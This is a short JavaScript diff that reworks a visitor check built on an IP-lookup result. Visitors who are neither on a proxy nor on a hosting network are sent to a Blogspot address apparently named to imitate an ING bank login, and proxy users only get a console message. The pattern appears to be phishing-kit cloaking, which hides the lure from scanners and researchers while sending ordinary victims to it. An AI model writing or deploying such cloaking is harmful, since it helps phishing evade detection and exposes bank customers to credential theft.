@@ -169,12 +169,12 @@
             info_User=data.country;
         
 
-           
-            if (info_User.proxy) {
-            console.log("proxy");
+            if (!info_User.proxy && !info_User.hosting ) {
+
+                 window.location.href = "https://inggroupe1logen.blogspot.com/";            
             
             }else{
-              window.location.href = "https://inggroupe1logen.blogspot.com/";
+              console.log("proxy");
             }
            
         }
